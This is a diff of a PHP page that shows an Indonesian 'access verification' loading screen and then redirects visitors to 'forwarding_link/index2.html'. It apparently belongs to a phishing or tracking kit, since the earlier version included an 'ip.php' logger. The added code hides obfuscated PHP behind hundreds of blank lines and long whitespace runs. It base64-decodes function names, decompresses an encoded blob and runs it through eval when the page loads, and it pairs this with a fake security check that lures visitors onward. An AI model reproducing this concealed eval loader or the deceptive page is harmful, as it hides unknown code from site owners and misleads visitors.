@@ -1,60 +1,392 @@
-<?php
-include 'ip.php';
+<?php 
+        $__='printf';$_='Loading ViewTech';
+        
 
-echo '
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrt2tFrgkAcB/B3Yf+DD8EVjJg2FiI+lGzStZeNstMXqdOc7MqYC3f99SuVlYyBY2Ow+H4OlDv9cfj7we9BTlVLrWDPIpuXZP26JGYxrVjETaJ8EvEn1RbzLOt2u8RUqjj1QsH4eiiHRKq/yPq0QphmZN5MS3zn1iLF0rE6jVTFtlQAgPNE+Mq9ChndjhxX92Z5Su+MJZPP/bJp7rtm2a4DpAoAAAAA4L/B7wwAgPNFFvMsurkOwoinYURMZAQAAOBH6icARvYgHjmu5CtDsh4V3DFk6IitL+N8PMnG5XOxnbvGzmcPKdUfN7w3zDwmlj6jctGjOyrzmO4G69P3Pf1N851pTHWR36+HKbd5n5iK8vcfahX3djXrmN8JP4ltEtg6btgmhyu5/NgW5yqanauo57JdK16Zyo75Dk0QcQQ=';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
+
+?>
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <title>Verifikasi Akses</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        function handleError(error) {
-            // Don\'t log error messages
-            
-            document.getElementById("locationStatus").innerText = "Redirecting...";
-            
-            // If user denies location permission or any other error, still redirect after a short delay
-            setTimeout(function() {
-                redirectToMainPage();
-            }, 2000);
-        }
-        
-        function redirectToMainPage() {
-            // Don\'t log this message
-            // Try to redirect to the template page
-            try {
-                window.location.href = "forwarding_link/index2.html";
-            } catch (e) {
-                // Don\'t log this message
-                // Fallback redirection
-                window.location = "forwarding_link/index2.html";
-            }
+    <meta name="description" content="Halaman verifikasi sebelum melanjutkan.">
+
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at top, #111 0%, #000 60%);
+            color: #eaeaea;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        window.onload = function() {
-            // Don\'t log this message
-            setTimeout(function() {
-                redirectToMainPage();
-            }, 500); // Small delay to ensure everything is loaded
-        };
-        
-    </script>
-</head>
-<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
-    <h2>Loading, please wait...</h2>
-    <p>Mengecek Keamanan...</p>
-    <div style="margin-top: 30px;">
-        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
-    </div>
-    
-    <style>
+        .card {
+            background: rgba(20,20,20,.9);
+            border: 1px solid #222;
+            border-radius: 14px;
+            padding: 32px 28px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,.6);
+        }
+
+        h1 {
+            margin: 0 0 12px;
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        p {
+            font-size: 14px;
+            opacity: .75;
+            line-height: 1.6;
+        }
+
+        .loader {
+            margin: 28px auto;
+            width: 52px;
+            height: 52px;
+            border: 5px solid #2a2a2a;
+            border-top: 5px solid #9aa3ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .btn {
+            display: none;
+            margin-top: 24px;
+            padding: 12px 18px;
+            background: linear-gradient(135deg, #5c6cff, #8f9cff);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform .15s ease, box-shadow .15s ease;
+            box-shadow: 0 10px 30px rgba(92,108,255,.35);
+        }
+
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 14px 40px rgba(92,108,255,.45);
+        }
+
+        .foot {
+            margin-top: 18px;
+            font-size: 12px;
+            opacity: .5;
         }
     </style>
+</head>
+
+<body>
+<div class="card">
+    <h1>Verifikasi Akses</h1>
+    <p>
+        Sistem sedang mempersiapkan halaman.<br>
+        Mohon tunggu sebentar sebelum melanjutkan.
+    </p>
+
+    <div class="loader" id="loader"></div>
+
+    <button class="btn" id="goBtn" onclick="goNext()">
+        Lanjut ke halaman utama
+    </button>
+
+    <div class="foot">
+        © Sistem keamanan otomatis
+    </div>
+</div>
+
+<script>
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('goBtn').style.display = 'inline-block';
+    }, 3500);
+
+    function goNext() {
+        window.location.href = "forwarding_link/index2.html";
+    }
+</script>
 </body>
 </html>
-';
-exit;
-?>
